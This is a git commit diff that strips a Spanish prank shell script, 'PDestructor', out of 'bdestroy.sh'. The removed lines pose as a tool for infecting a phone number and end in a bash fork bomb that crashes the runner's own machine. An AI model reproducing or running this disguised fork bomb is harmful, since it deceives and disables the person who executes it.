f1e6bb615a0c161ff37f944698d87097a0fd8e3a
Apasionado <58598786+oseguir@users.noreply.github.com>
2024-05-09 23:40:35 +0200

    Update bdestroy.sh

--- bdestroy.sh
+++ bdestroy.sh
@@ -6,69 +6,13 @@ echo '
     \`.|\..----...-``   `-._.-`_.-``
     /  ` `         ,       __.--`
     )/` _/     \   `-_,   /
-    `-``` ```\_  ,_.-;_.-\_ `,     Bin/army
+    `-``` ```\_  ,_.-;_.-\_ `,     
         _.-`_./   {_.`   ; /
        {_.-``-`         {_/
 
 
 $>Welcome to PDestructor :) 
 
+Eliminado por seguridad
 '
-sleep 2
-echo '[ X ] Ingrese el número de tlf al que enviarle el binario...: 
 
-'
-read -p 'C:\ ' tlf
-sleep 3
-clear 
-echo 'Analizando...' 
-sleep 2
-echo 'Número Existente!' 
-clear
-echo '
-
-[ + ] Elige el binario a enviarle! [ + ] 
-
-' 
-echo '[ 1 ]  ÐĚ#ŤR0YĘR' 
-sleep 0.1
-echo '[ 2 ]  FKYØU' 
-sleep 0.1
-echo '[ 3 ]  GÜRŮ' 
-sleep 0.1
-echo '[ 4 ]【ḶḕḠḭṏN'
-sleep 0.1
-echo '[ 5 ]〖乃ѺѺᎷ〗
-
-'
-read -p 'C:\ ' bin
-echo  ' ' 
-case $bin in
-1)
-	echo 'Preparando binario Destroyer...'
-	;;
-2)
-	echo 'Preparando binario FKYOU...' 
-	;;
-3)
-	echo 'Preparando binario GURU...'
-	;;
-4)
-	echo 'Preparando binario LeGioN...'
-	;;
-5)
-	echo 'Preparando binario B00M...'
-	;;
-*)
-	;;
-esac
-sleep 2
-echo 'Un binario afecta tanto el que lo lanza como a la víctima...' 
-sleep 5
-echo ' ' 
-echo '$>Atacando... 
-
-infectando a' $tlf
-sleep 2
-echo '¡En ejecución!'
-:(){ :|: & };:
